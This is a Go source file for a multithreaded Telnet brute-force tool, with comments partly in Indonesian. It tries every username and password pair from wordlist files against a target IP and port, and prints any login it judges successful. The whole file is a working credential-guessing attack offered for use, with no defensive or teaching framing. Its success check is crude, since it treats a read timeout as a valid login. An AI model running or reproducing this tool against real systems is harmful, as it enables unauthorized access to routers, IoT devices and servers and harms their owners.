package main

import (
	"bufio"
	"context"
	"flag"
	"fmt"
	"net"
	"os"
	"strings"
	"sync"
	"time"
)

type Credential struct {
	Username string
	Password string
}

func main() {
	// Flag command line
	targetIP := flag.String("target", "", "Target IP address")
	port := flag.Int("port", 23, "Telnet port (default: 23)")
	userFile := flag.String("users", "", "The file contains a list of usernames (one per line)")
	passFile := flag.String("passwords", "", "The file contains a list of passwords (one per line)")
	threads := flag.Int("threads", 1, "Default number of threads (goroutines) 1")
	timeoutSec := flag.Int("timeout", 5, "Connection timeout in seconds")
	flag.Parse()

	if *targetIP == "" || *userFile == "" || *passFile == "" {
		fmt.Println("Usage: Enter the variables correctly.")
		os.Exit(1)
	}

	// Baca daftar username
	usernames, err := readLines(*userFile)
	if err != nil {
		fmt.Printf("  [ERROR] Failed to read username file => %v\n", err)
		os.Exit(1)
	}

	// Baca daftar password
	passwords, err := readLines(*passFile)
	if err != nil {
		fmt.Printf("  [ERROR] Failed to read password file => %v\n", err)
		os.Exit(1)
	}
	fmt.Printf("  [*] Use => %d thread, total combination => %d\n", *threads, len(usernames)*len(passwords))

	// Siapkan context untuk cancel jika sukses
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	// Channel jobs dan hasil
	jobs := make(chan Credential, *threads*10)
	results := make(chan string, 1)

	// Worker pool
	var wg sync.WaitGroup
	for i := 0; i < *threads; i++ {
		wg.Add(1)
		go worker(ctx, *targetIP, *port, *timeoutSec, jobs, results, &wg)
	}

	// Produser: generate kombinasi user-password
	go producer(ctx, jobs, usernames, passwords)

	// Monitor hasil sukses
	go func() {
		for res := range results {
			fmt.Println(res)
			cancel() // hentikan semua worker
		}
	}()

	// Tunggu semua worker selesai (atau kena cancel)
	wg.Wait()
	close(results)

	fmt.Println("  [*] Bruteforce completed. No credentials were successful.")
}

// Membaca file teks (satu baris per item)
func readLines(path string) ([]string, error) {
	file, err := os.Open(path)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	var lines []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line != "" {
			lines = append(lines, line)
		}
	}
	return lines, scanner.Err()
}

// Produser mengirim kombinasi user:pass ke channel jobs
func producer(ctx context.Context, jobs chan<- Credential, usernames []string, passwords []string) {
	defer close(jobs)
	for _, user := range usernames {
		for _, pass := range passwords {
			select {
			case <-ctx.Done():
				return // berhenti jika sukses ditemukan
			default:
				jobs <- Credential{Username: user, Password: pass}
			}
		}
	}
}

// Worker mencoba login dan mengirim hasil sukses ke channel results
func worker(ctx context.Context, ip string, port, timeoutSec int, jobs <-chan Credential, results chan<- string, wg *sync.WaitGroup) {
	defer wg.Done()
	for {
		select {
		case <-ctx.Done():
			return
		case cred, ok := <-jobs:
			if !ok {
				return
			}
			fmt.Printf("  [>] TRY => U:%-20s P:%-20s\n", cred.Username, cred.Password)
			if tryLogin(ip, port, cred.Username, cred.Password, timeoutSec) {
				select {
				case results <- fmt.Sprintf("  [SUCCESS] LOGIN SUCCESS! => U:%s :: P:%s", cred.Username, cred.Password):
				default:
				}
				return
			}
		}
	}
}

// Fungsi utama percobaan login Telnet
func tryLogin(ip string, port int, username, password string, timeoutSec int) bool {
	address := fmt.Sprintf("%s:%d", ip, port)
	conn, err := net.DialTimeout("tcp", address, time.Duration(timeoutSec)*time.Second)
	if err != nil {
		return false
	}
	defer conn.Close()

	conn.SetDeadline(time.Now().Add(time.Duration(timeoutSec) * time.Second))

	// Baca prompt awal (abaikan)
	buf := make([]byte, 256)
	conn.Read(buf)

	// Kirim username
	_, err = conn.Write([]byte(username + "\n"))
	if err != nil {
		return false
	}

	// Baca prompt password (abaikan)
	conn.Read(buf)

	// Kirim password
	_, err = conn.Write([]byte(password + "\n"))
	if err != nil {
		return false
	}

	time.Sleep(500 * time.Millisecond)

	conn.SetReadDeadline(time.Now().Add(2 * time.Second))
	n, err := conn.Read(buf)
	if err != nil {
		// Timeout bisa berarti sukses (prompt shell)
		if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
			return true
		}
		return false
	}
	response := strings.ToLower(string(buf[:n]))

	// Indikator sukses
	successIndicators := []string{"$", "#", ">", "%", "welcome", "last login", "password changed", "press enter"}
	for _, ind := range successIndicators {
		if strings.Contains(response, ind) {
			return true
		}
	}

	// Indikator gagal
	if strings.Contains(response, "incorrect") ||
		strings.Contains(response, "failed") ||
		strings.Contains(response, "denied") ||
		strings.Contains(response, "invalid") {
		return false
	}

	return false
}
